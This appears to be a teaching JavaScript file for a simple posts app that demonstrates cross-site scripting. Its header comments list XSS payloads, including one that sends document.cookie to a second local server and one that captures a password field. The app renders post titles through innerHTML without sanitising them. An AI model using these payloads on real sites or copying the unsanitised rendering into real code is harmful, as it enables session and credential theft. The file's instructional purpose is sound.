// ATTACKS
// Click this super exciting <a href="javascript:alert('Not what you thought would happen?')">link</a>
// Harmless, right? <div onmouseover="console.log('cookie has been stolen');document.body.style.backgroundColor='red';document.body.innerHTML='<h1>You have been hacked!</h1>'" style="position:fixed;left:0;top:0;width:9999px;height:9999px;"></div>
// Ooops, the image didn't load... <img src=x onerror='fetch("http://localhost:3001/cookies", {method: "POST",headers: {"Content-Type": "application/json",Accepts: "application/json"},body: JSON.stringify({title: document.cookie})})'>
// Going to steal your password <img src=x onerror="document.getElementById('password-input').addEventListener('blur', function(e) {console.log('Your password is: ' + e.target.value)})">

document.addEventListener("DOMContentLoaded", function() {
  listenToFormSubmit();
  fetchPosts();
});

function listenToFormSubmit() {
  const form = document.querySelector("form");

  form.addEventListener("submit", function(e) {
    e.preventDefault();

    createPost({ title: e.target.title.value });
  });
}

function createPost(post) {
  fetch("http://localhost:3000/posts", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Accepts: "application/json"
    },
    body: JSON.stringify(post)
  })
    .then(resp => resp.json())
    .then(data => {
      console.log(data);
    });
}

function fetchPosts() {
  fetch("http://localhost:3000/posts")
    .then(resp => resp.json())
    .then(posts => {
      const postDiv = document.getElementById("posts");

      posts.map(post => {
        // innerHTML is DANGEROUS
        postDiv.innerHTML += renderPost(post);
      });
    });
}

function deletePost(postId) {
  fetch(`http://localhost:3000/posts/${postId}`, {
    method: "DELETE",
    headers: {
      "Content-Type": "application/json",
      Accepts: "application/json"
    }
  });
}

function renderPost(post) {
  return `
		<li>
			${post.title}
			<button onclick="deletePost(${post.id})">Delete</button>
		</li>
	`;
}
